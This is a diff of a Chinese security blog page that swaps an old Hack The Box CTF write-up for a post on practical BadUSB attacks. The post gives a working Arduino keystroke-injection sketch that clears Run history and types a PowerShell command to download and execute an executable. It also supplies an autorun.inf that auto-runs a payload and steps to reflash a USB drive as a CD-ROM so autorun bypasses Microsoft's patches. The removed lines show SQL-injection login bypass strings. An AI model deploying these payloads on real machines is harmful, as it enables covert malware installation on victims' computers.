@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   
-  <title>hack box 记录 | 算了吧 Blog</title>
+  <title>Badusb实际应用 | 算了吧 Blog</title>
   
   
 
@@ -246,8 +246,8 @@ var _hmt = _hmt || [];
         
   
     <h1 class="title">
-      <a href="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/">
-        hack box 记录
+      <a href="/2020/04/22/Badusb%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8/">
+        Badusb实际应用
       </a>
     </h1>
   
@@ -278,7 +278,7 @@ var _hmt = _hmt || [];
             <div class="new-meta-item date">
   <a class='notlink'>
     <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-    <p>2020-01-04</p>
+    <p>2020-04-22</p>
   </a>
 </div>
 
@@ -328,77 +328,61 @@ var _hmt = _hmt || [];
 
     <section class="article typo">
       <div class="article-entry" itemprop="articleBody">
-        <p>持续更新….</p>
-<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><p>​    简要说明一下怎么进行注册，打开链接 <a href="https://www.hackthebox.eu/invite" target="_blank" rel="noopener">https://www.hackthebox.eu/invite</a> 在console输入 makeInviteCode() </p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/1.png" alt="img"></p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/2.png" alt="img"></p>
-<p>​    可以得到一个base64加密的数据</p>
+        <p>BadUSB简单实用</p>
+<a id="more"></a>
+
+<h1 id="BadUSB介绍"><a href="#BadUSB介绍" class="headerlink" title="BadUSB介绍"></a>BadUSB介绍</h1><p>​    对于插谁谁怀孕的badusb一直都是大家比较喜欢讨论研究的东西。这几天因为客户现场需求需要使用USB进行攻击，这里最最开始想到的是虚拟键盘的BadUSB。直接淘宝购买了两个Arduino ide的badUSB，价格相对比较便宜，20多一个。大致的攻击流程与BadUSB使用方法一样：用户插入U盘，就会自动执行预置在固件中的恶意代码，下载服务器上恶意文件，执行恶意操作</p>
+<p>针对于什么是Arduino ide介绍我就不多说了，互联网上的大佬们已经解释的很清楚了，看下面的说明既可。</p>
 <blockquote>
-<p>SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl</p>
+<h4 id="什么是Arduino-ide？"><a href="#什么是Arduino-ide？" class="headerlink" title="什么是Arduino ide？"></a><strong>什么是Arduino ide？</strong></h4><p>Arduino 是一款便捷灵活、方便上手的开源电子原型平台。包含硬件（各种型号的 Arduino 板）和软件（Arduino IDE)。由一个欧洲开发团队于2005年冬季开发。</p>
+<p>其成员包括 Massimo Banzi、David Cuartielles、Tom Igoe、Gianluca Martino、David Mellis 和 Nicholas Zambetti 等。</p>
+<p>它构建于开放原始码 simple I/O 介面版，并且具有使用类似 Java、C 语言的 Processing/Wiring 开发环境。</p>
+<p>主要包含两个主要的部分：硬件部分是可以用来做电路连接的 Arduino 电路板；另外一个则是 Arduino IDE，你的计算机中的程序开发环境。</p>
+<p>你只要在IDE中编写程序代码，将程序上传到 Arduino 电路板后，程序便会告诉 Arduino 电路板要做些什么了。</p>
+<p>Arduino 能通过各种各样的传感器来感知环境，通过控制灯光、马达和其他的装置来反馈、影响环境。板子上的微控制器可以通过 Arduino 的编程语言来编写程序，编译成二进制文件，烧录进微控制器。</p>
+<p>对 Arduino 的编程是通过 Arduino 编程语言 (基于 Wiring)和 Arduino 开发环境（基于 Processing）来实现的。</p>
+<p>基于 Arduino 的项目，可以只包含 Arduino，也可以包含 Arduino 和其他一些在 PC 上运行的软件，他们之间进行通信 (比如 Flash, Processing, MaxMSP)来实现</p>
 </blockquote>
-<p>解码后提示信息为</p>
+<pre><code>&gt;其实就是插入USB后模拟键盘进行操作。- -.</code></pre><h1 id="BadUSB应用"><a href="#BadUSB应用" class="headerlink" title="BadUSB应用"></a>BadUSB应用</h1><p>这里需要下载Arduino开发IDE，我使用的恶意下载脚本来自github，文章最后我都附上相关的代码与工具。</p>
+<h2 id="设置开发板类型"><a href="#设置开发板类型" class="headerlink" title="设置开发板类型"></a>设置开发板类型</h2><p>​    我这里使用的是Arduino Leonaedo 。依此选择工具&gt;开发板Arduino Leonaedo</p>
+<p><img src="/2020/04/22/Badusb%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8/1.png" alt="img"></p>
+<h2 id="设置设备使用的COM口"><a href="#设置设备使用的COM口" class="headerlink" title="设置设备使用的COM口"></a>设置设备使用的COM口</h2><p>​    因为我这就插入了一个COM设备，直接选择既可。其他情况下选择括号里对应的开发板名称既可。</p>
+<p><img src="/2020/04/22/Badusb%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8/2.png" alt="img"></p>
+<h2 id="写入并测试"><a href="#写入并测试" class="headerlink" title="写入并测试"></a>写入并测试</h2><p>因为我这里测试的系统是windows10，支持POWERSHELL相对来说简单一点，直接写入代码，尝试获取127.0.0.1:9000的W.exe。并进行运行，这里就不展示了，比较简单。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Keyboard.h&gt;</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;<span class="comment">//初始化</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">begin</span>();<span class="comment">//开始键盘通讯 </span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//延时</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_LEFT_GUI);<span class="comment">//win键 </span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(<span class="string">'r'</span>);<span class="comment">//r键 </span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">delay</span>(<span class="number">500</span>); </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_LEFT_GUI);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(<span class="string">'r'</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK);<span class="comment">//利用开大写输小写绕过输入法</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">delay</span>(<span class="number">100</span>); </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">println</span>(<span class="string">"CMD /C START /MIN REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&amp;CMD /C START /MIN POWERSHELL $P = nEW-oBJECT sYSTEM.nET.wEBcLIENT;$P.dOWNLOADfILE('HTTP://127.0.0.1:9000/W.exe', 'D:\\X.EXE');START D:\\X.EXE;EXIT"</span>);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">press</span>(KEY_CAPS_LOCK);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">release</span>(KEY_CAPS_LOCK);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">  <span class="built_in">Keyboard</span>.<span class="built_in">end</span>();<span class="comment">//结束键盘通讯 </span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span><span class="comment">//循环</span></span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"><span class="function"></span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<h1 id="现场情况"><a href="#现场情况" class="headerlink" title="现场情况"></a>现场情况</h1><p>​    因为实际现场不允许联网，只能尝试其他方法，这里使用的是USB的自动播放，但是经过查看大佬的文章查找发现USB方式已经不可行了，尝试识别成光盘。</p>
 <blockquote>
-<p>​    In order to generate the invite code, make a POST request to /api/invite/generate</p>
+<p>大佬的解释如下：</p>
+<p>微软也给出了相对应的解决方案，早在2011年2月8日，微软就提供了名为KB967940的补丁，该补丁限定Windows XP、Windows Server 2003、Vista和Windows Server 2008平台上的自动运行功能，不过由于是可选补丁，由用户自主选择进行安装，因此没有达到微软预期的目的，因此后续由提供了补丁KB971029通过自动更新功能推送至用户系统，彻底阻断了USB的自动运行，对利用该手法进行传播的病毒进行了有效的抑制。</p>
+<p>​    </p>
+<p>​    那么USB利用autorun.inf进行攻击的手法是否到此就截止了呢？答案是否定的，技术的发展永远是具有两面性，在带给人们方便快捷的同时，也在人们头顶上安放了一柄达摩克利斯之剑。由于该问题的本质是自动播放导致的问题，至此的解决措施并不是针对自动播放进行的，而是针对USB进行的禁止操作，那么毫无疑问刻录到光盘内的病毒还是会被自动执行，但在前面我们也已经考虑过插入光盘的操作非常麻烦，很难在别人不经意间完成攻击，那么我们重新思考能否在USB上做一些操作。</p>
+<p>比较容易想到的方法就是让USB被系统识别为光盘，那么写在USB中的病毒文件便能像写在光盘中一样被自动执行，操作其实也很简单，主要分为两个步骤：1. 使用量产工具将USB量产为CD-ROM光驱；2. 将autorun.inf文件和病毒文件制作成ISO文件写入U盘。使用该方法即可成功骗过操作系统，使USB的autorun攻击依旧有效。</p>
 </blockquote>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/3.png" alt="img"></p>
-<p>我这里通过bp进行发包，获取key，获取到的code字段还需要进行base64解密,解密后的验证码就直接可以进行注册了。</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/4.png" alt="img"></p>
-<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>官方会提供openvpn链接配置文件，因为我这里使用的是mac下载的是Tunnelblick。</p>
-<p>进行下载openVPN链接包，通过软件进行拨号链接</p>
-<h1 id="Cartographer"><a href="#Cartographer" class="headerlink" title="Cartographer"></a>Cartographer</h1><p>介绍：一些地下黑客正在开发新的命令和控制服务器。您可以闯入看看他们在做什么吗？</p>
-<p>在拿到网站的时候尝试了一下admin和top100的弱口令，失败后，感觉可能是万能密码登录，直接通过字典进行爆破尝试,成功admin’or’a’=’a</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/6.png" alt="img"></p>
-<p>登陆成功后网页重定向到了<a href="http://docker.hackthebox.eu:30642/panel.php?info=home" target="_blank" rel="noopener">http://docker.hackthebox.eu:30642/panel.php?info=home</a></p>
-<p><a href="http://docker.hackthebox.eu:30642/panel.php?info=home’" target="_blank" rel="noopener">http://docker.hackthebox.eu:30642/panel.php?info=home’</a> 网页提示not fount！</p>
-<p>怀疑可能是文件包含，尝试将home修改成flag。成功获取flag</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/7.png" alt="img"></p>
-<h1 id="Emdee-five-for-life"><a href="#Emdee-five-for-life" class="headerlink" title="Emdee five for life"></a>Emdee five for life</h1><p>介绍:您可以加密得足够快吗？</p>
-<p>这里不管怎么提交都会提示Too slow！</p>
-<p>想起了当时bugku 里面的一个题，直接尝试编写python脚本进行提交。</p>
-<p>直接使用burp生成简单的修改一下，OK </p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/10.png" alt="img"></p>
-<p>测试脚本地址：</p>
+<pre><code>## USB量产为CD-ROM</code></pre><p>​    首先使用芯片无忧查看芯片的详细类型，我这里的是</p>
 <blockquote>
-<p><a href="https://github.com/icssec/HacktheboxExp/blob/master/hackbox-Emdee%20five%20for%20life.py" target="_blank" rel="noopener">https://github.com/icssec/HacktheboxExp/blob/master/hackbox-Emdee%20five%20for%20life.py</a></p>
+<p>芯片制造商:  群联(Phison)<br>芯片型号  :  PS2251-68</p>
 </blockquote>
-<h1 id="Fuzzy"><a href="#Fuzzy" class="headerlink" title="Fuzzy"></a>Fuzzy</h1><p>介绍:我们已经获得了一些我们认为与目标内部网络相连的基础架构的访问权。我们需要您帮助获取他们当前正在开发的网站的管理员密码。</p>
-<p>dirmap一波发现一个<a href="http://docker.hackthebox.eu:30738/api/" target="_blank" rel="noopener">http://docker.hackthebox.eu:30738/api/</a>  但是页面是空的，蒙了~</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/11.png" alt="img"></p>
-<p>找了一下网上的人解题思路，蒙蔽了，这个大佬是用的dirbuster,这api下面有一个action.php</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/12.png" alt="img"></p>
-<p>心思尝试一下，时间太长了。算了吧。访问页面后提示Error: Parameter not set</p>
-<p>还是通过dirbuster进行测试。</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/14.png" alt="img"></p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/13.png" alt="img"></p>
-<p>fuzz到参数后进行访问页面提示Error: Account ID not found</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/15.png" alt="img"></p>
-<p>直接通过burp进行测试一下ID字段的参数，通过burp的number进行测试</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/16.png" alt="img"></p>
-<p>payload确定为20，直接查看response获得flag</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/17.png" alt="img"></p>
-<h1 id="Lernaean"><a href="#Lernaean" class="headerlink" title="Lernaean"></a>Lernaean</h1><ol>
-<li><p>简单使用dirmap跑了一波 无果</p>
-</li>
-<li><p>标题网站页面的提示’请不要尝试猜测我的密码！’ 那就必须得尝试一下啊。</p>
-</li>
-<li><p>上来使用sqlitop进行尝试，失败了~不能使用万能密码登录</p>
-</li>
-<li><p>那就尝试一下top的字典密码吧</p>
-<p>我这里使用的是</p>
-<blockquote>
-<p><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
+<p><img src="/2020/04/22/Badusb%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8/3.png" alt="img"></p>
+<h2 id="镜像文件"><a href="#镜像文件" class="headerlink" title="镜像文件"></a>镜像文件</h2><p>我这里将要运行攻击的exe程序命名为a.exe</p>
+<p>并新建AutoRun.inF写入下面的配置文件，让其插入后自动运行。</p>
+<p>并将两个文件制作成ISO镜像</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">[autorun]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">open=a.exe</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">shellexecute=a.exe e</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">shell\auto\<span class="built_in">command</span>=a.exe e</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">shell=auto</span></pre></td></tr></table></figure>
+
+
+
+<h2 id="转换与写入"><a href="#转换与写入" class="headerlink" title="转换与写入"></a>转换与写入</h2><p><strong>U盘的型号可能存在区别，大家需要谨慎操作，选择自己型号对应的工具</strong></p>
+<p><strong>U盘的型号可能存在区别，大家需要谨慎操作，选择自己型号对应的工具</strong></p>
+<p><strong>U盘的型号可能存在区别，大家需要谨慎操作，选择自己型号对应的工具</strong></p>
+<p>​    这里呢我使用的工具是ModeConverter v1.0.1.5_CHS 依此选择按照软件使用修改ISO镜像文件即可。当再次插入的时，系统允许CD-ROM自动播放的情况下既可达到自动攻击的效果。</p>
+<p><img src="/2020/04/22/Badusb%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8/4.png" alt="img"></p>
+<h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><p><a href="https://github.com/icssec/badUSB" target="_blank" rel="noopener">https://github.com/icssec/badUSB</a></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><blockquote>
+<p><a href="https://security.tencent.com/index.php/blog/msg/74" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/74</a></p>
+<p><a href="https://gitchat.csdn.net/activity/59afa79600b85b45e40028d6?utm_source=so" target="_blank" rel="noopener">https://gitchat.csdn.net/activity/59afa79600b85b45e40028d6?utm_source=so</a></p>
+<p><a href="https://cloud.tencent.com/developer/article/1098167" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1098167</a></p>
+<p><a href="https://github.com/Xyntax/BadUSB-code" target="_blank" rel="noopener">https://github.com/Xyntax/BadUSB-code</a></p>
 </blockquote>
-</li>
-<li><p>发现密码是:leonardo 直接获得flag</p>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/20.png" alt="img"></p>
-</li>
-</ol>
-<h1 id="FreeLancer"><a href="#FreeLancer" class="headerlink" title="FreeLancer"></a>FreeLancer</h1><ol>
-<li>首先点击了一下网站的相关链接，都是伪链接。</li>
-<li>dirmap扫描了一下依然没有东西。</li>
-<li>转战看了看网站的通讯数据流。在查看网站源代码的发现了点东西</li>
-</ol>
-<p><img src="/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/21.png" alt="img"></p>
 
       </div>
       
@@ -411,10 +395,10 @@ var _hmt = _hmt || [];
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-02-16T17:18:40+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-22T19:29:21+08:00">
   <a class='notlink'>
     <i class="fas fa-clock" aria-hidden="true"></i>
-    <p>更新于 2020年2月16日</p>
+    <p>更新于 2020年4月22日</p>
   </a>
 </div>
 
@@ -423,7 +407,7 @@ var _hmt = _hmt || [];
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" rel="nofollow"><i class="fas fa-tag" aria-hidden="true"></i><p>靶场记录</p></a></div>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E7%A1%AC%E4%BB%B6%E8%AE%BE%E5%A4%87/" rel="nofollow"><i class="fas fa-tag" aria-hidden="true"></i><p>硬件设备</p></a></div>
 
 
         
@@ -436,7 +420,7 @@ var _hmt = _hmt || [];
       
         <a class="-mob-share-qq" title="QQ好友" rel="external nofollow noopener noreferrer"
           
-          href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/&title=hack box 记录 | 算了吧 Blog&summary="
+          href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2020/04/22/Badusb%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8/&title=Badusb实际应用 | 算了吧 Blog&summary=BadUSB简单实用"
           
           >
           
@@ -448,7 +432,7 @@ var _hmt = _hmt || [];
       
         <a class="-mob-share-qzone" title="QQ空间" rel="external nofollow noopener noreferrer"
           
-          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/&title=hack box 记录 | 算了吧 Blog&summary="
+          href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/04/22/Badusb%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8/&title=Badusb实际应用 | 算了吧 Blog&summary=BadUSB简单实用"
           
           >
           
@@ -458,7 +442,7 @@ var _hmt = _hmt || [];
       
     
       
-        <a class='qrcode' rel="external nofollow noopener noreferrer noopener" href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACt0lEQVR42u3awWorMQwF0Pz/T7dQuig0nlxJdiaLM6vghlhnHth6kh6P+Pn6ef5//rtSXV99zn9n24OHh4fXCn31rDbIV1awa/D1ryUx4+Hh4Z3m5VsmK/lRnlwDyYtbruPh4eHdypsc4tVUu5rW4+Hh4X0yr7pBUm7oXRV4eHh49/KSYkQe0CTc22oteHh4eDFv0gC76/Ob+nt4eHh4xa56cuBWy7j5cT+J8/cX8PDw8A7w8hQ22ez6O3mS3UuRC/9jwMPDwzvAm29QJc0Lysvv4OHh4W3lXV8JSXE2LwFXW1/VVPvJCh4eHt4xXn7E7xqrSvbtNdKeXAx4eHh4W3n5l6rF3LxlVR0ayJN4PDw8vHO8eVsrH8OqJtbVf4wIiYeHhzfmzY/y/DrJRwd6Zd/l6AAeHh7eJl618Z83t6oDAdW/RgVfPDw8vAO86tGcXAbVEkN1/VF98PDw8A7zqshqs39y8eRDXcuLAQ8PD+8tvGQlv0Im69Wo8PDw8E7weqWBvYlvtTibjxTg4eHhnePljfk80F4JOB9TiHbBw8PDO8CrDjnlQfdGB3pDVy9eCh4eHt5W3q5Ae039aop8HeGLlBoPDw9vKy8Pqzc0sKunj4eHh/c5vF4Bd96gql4h1Ujw8PDwTvDmx3Fv7CC/WvIr4UWtBQ8PD28TrzcylbevNkyETcrKeHh4eId5CbJaDpgn06MkHg8PD+8ALwmr1+7KS7q9MkSvvIuHh4c3530VnyThnoN7KXvU38PDw8Mb8/JnV1m2N9p14sXh4eHhTXh5utwr++YNtl0x4OHh4b2Htys5zhv/vVS+3KjDw8PDu5WXFynKx3e13hyMEeDh4eF9Gq+6/ajMGrfKRik1Hh4eXpHXKwT0Ap2kyOUkGw8PD+8Ar7dldVgqf3G9ka/NbxQPDw/v+fMNEntUuVJB/aUAAAAASUVORK5CYII=' target="_blank">
+        <a class='qrcode' rel="external nofollow noopener noreferrer noopener" href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvUlEQVR42u3aQW7DMAwEwP7/0y3QU4HCzi4lOTmMT0GTWBoVMBmSX1/x9f17Xf3977v/X+ffvXr3/pMbLjw8PLzR1u9vd3/rfCv5FvODe7EuHh4e3jHe/VZadn5ks8BQHB8eHh7eW3mzz+SP9VmQwMPDw/tk3tVWcuT9du/vj4eHh/dpvDz93RUwkvCQ72dDrQUPDw8v5rUNsE94fbC/h4eHh7fQVZ8FiZW0uF33xW7x8PDwDvDul0metLPhgPUVi+EGPDw8vAO8tjCaFHOT4YA2E146Yjw8PLwDvOTHf14myMuy7cBBfih4eHh453j5QzZPaveOAuShBQ8PD+8ZXvugTwJGi29T5LycgYeHh/cML9l6W8LIyxYr9yxq1Xh4eHgj3ixVnQ0BJCl1vkrUGMPDw8N7nJc/rHeVHvICxH24qiMJHh4eXsk70ZRqQ8hKeLg8Gjw8PLwDvDw9bdPolSZZfujRTwI8PDy8Y7z2M21Tf++IQJ704+Hh4T3DawupeardFnmTosOLoIWHh4e3ldc+jtsNtXfIDzFJzfHw8PDO8ZL8c1Z0WL//7CAuRwfw8PDwlnnrhYmVMaw2989DAh4eHt6TvLw93ybZ7dbbsFT8k/Dw8PAWeHlZdrZYPpLVBpI6yuHh4eEd5rWtrKQonFOT4m8U6/Dw8PAe5+UbbZfPy6/fwXW5Qzw8PLwDvLbcsFLAXR8+aHeCh4eHd4KXN+nztHhXqt025C4nI/Dw8PAO8/LGVTTktLUlVu8HDw8P7wAvv4oMPeblpYqi6TW78PDw8Epe+8ieJcptySMvWLz4Lh4eHt4x3mwka1aAWKo6tyNceHh4eG/lzUav8gS6HdWKjhIPDw/vA3ht+tuOZyWrFMMHeHh4eMd4edNrHZDfLU/fL++Dh4eHd4A3a4DNSqttOWN9bAsPDw9vK+8HuZNzqJ/46U8AAAAASUVORK5CYII=' target="_blank">
         
           <img src="https://cdn.jsdelivr.net/gh/xaoxuu/assets@19.1.9/logo/128/wechat.png">
         
@@ -468,7 +452,7 @@ var _hmt = _hmt || [];
       
         <a class="-mob-share-weibo" title="微博" rel="external nofollow noopener noreferrer"
           
-          href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/01/04/hack-box-%E8%AE%B0%E5%BD%95/&title=hack box 记录 | 算了吧 Blog&summary="
+          href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2020/04/22/Badusb%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8/&title=Badusb实际应用 | 算了吧 Blog&summary=BadUSB简单实用"
           
           >
           
@@ -478,7 +462,7 @@ var _hmt = _hmt || [];
       
     
       
-        <a class='qrcode' rel="external nofollow noopener noreferrer noopener" href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACt0lEQVR42u3awWorMQwF0Pz/T7dQuig0nlxJdiaLM6vghlhnHth6kh6P+Pn6ef5//rtSXV99zn9n24OHh4fXCn31rDbIV1awa/D1ryUx4+Hh4Z3m5VsmK/lRnlwDyYtbruPh4eHdypsc4tVUu5rW4+Hh4X0yr7pBUm7oXRV4eHh49/KSYkQe0CTc22oteHh4eDFv0gC76/Ob+nt4eHh4xa56cuBWy7j5cT+J8/cX8PDw8A7w8hQ22ez6O3mS3UuRC/9jwMPDwzvAm29QJc0Lysvv4OHh4W3lXV8JSXE2LwFXW1/VVPvJCh4eHt4xXn7E7xqrSvbtNdKeXAx4eHh4W3n5l6rF3LxlVR0ayJN4PDw8vHO8eVsrH8OqJtbVf4wIiYeHhzfmzY/y/DrJRwd6Zd/l6AAeHh7eJl618Z83t6oDAdW/RgVfPDw8vAO86tGcXAbVEkN1/VF98PDw8A7zqshqs39y8eRDXcuLAQ8PD+8tvGQlv0Im69Wo8PDw8E7weqWBvYlvtTibjxTg4eHhnePljfk80F4JOB9TiHbBw8PDO8CrDjnlQfdGB3pDVy9eCh4eHt5W3q5Ae039aop8HeGLlBoPDw9vKy8Pqzc0sKunj4eHh/c5vF4Bd96gql4h1Ujw8PDwTvDmx3Fv7CC/WvIr4UWtBQ8PD28TrzcylbevNkyETcrKeHh4eId5CbJaDpgn06MkHg8PD+8ALwmr1+7KS7q9MkSvvIuHh4c3530VnyThnoN7KXvU38PDw8Mb8/JnV1m2N9p14sXh4eHhTXh5utwr++YNtl0x4OHh4b2Htys5zhv/vVS+3KjDw8PDu5WXFynKx3e13hyMEeDh4eF9Gq+6/ajMGrfKRik1Hh4eXpHXKwT0Ap2kyOUkGw8PD+8Ar7dldVgqf3G9ka/NbxQPDw/v+fMNEntUuVJB/aUAAAAASUVORK5CYII=' target="_blank">
+        <a class='qrcode' rel="external nofollow noopener noreferrer noopener" href='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACvUlEQVR42u3aQW7DMAwEwP7/0y3QU4HCzi4lOTmMT0GTWBoVMBmSX1/x9f17Xf3977v/X+ffvXr3/pMbLjw8PLzR1u9vd3/rfCv5FvODe7EuHh4e3jHe/VZadn5ks8BQHB8eHh7eW3mzz+SP9VmQwMPDw/tk3tVWcuT9du/vj4eHh/dpvDz93RUwkvCQ72dDrQUPDw8v5rUNsE94fbC/h4eHh7fQVZ8FiZW0uF33xW7x8PDwDvDul0metLPhgPUVi+EGPDw8vAO8tjCaFHOT4YA2E146Yjw8PLwDvOTHf14myMuy7cBBfih4eHh453j5QzZPaveOAuShBQ8PD+8ZXvugTwJGi29T5LycgYeHh/cML9l6W8LIyxYr9yxq1Xh4eHgj3ixVnQ0BJCl1vkrUGMPDw8N7nJc/rHeVHvICxH24qiMJHh4eXsk70ZRqQ8hKeLg8Gjw8PLwDvDw9bdPolSZZfujRTwI8PDy8Y7z2M21Tf++IQJ704+Hh4T3DawupeardFnmTosOLoIWHh4e3ldc+jtsNtXfIDzFJzfHw8PDO8ZL8c1Z0WL//7CAuRwfw8PDwlnnrhYmVMaw2989DAh4eHt6TvLw93ybZ7dbbsFT8k/Dw8PAWeHlZdrZYPpLVBpI6yuHh4eEd5rWtrKQonFOT4m8U6/Dw8PAe5+UbbZfPy6/fwXW5Qzw8PLwDvLbcsFLAXR8+aHeC